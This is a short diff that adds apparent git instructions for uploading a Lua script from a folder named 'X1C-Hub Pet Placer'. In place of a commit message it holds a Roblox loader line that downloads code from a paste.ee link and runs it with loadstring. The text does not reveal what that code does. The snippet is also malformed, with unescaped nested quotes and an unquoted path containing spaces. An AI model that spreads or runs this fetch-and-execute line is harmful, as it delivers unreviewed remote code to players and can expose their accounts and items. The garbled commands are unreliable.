@@ -1,0 +1,6 @@
+git clone https://github.com/your-username/your-repo-name.git
+cd X1C-Hub Pet Placer
+cp /path/to/MyScript.lua .   # or manually move the file here
+git add MyScript.lua
+git commit -m "loadstring(game:HttpGet("https://paste.ee/r/QpOSotg9"))()"
+git push
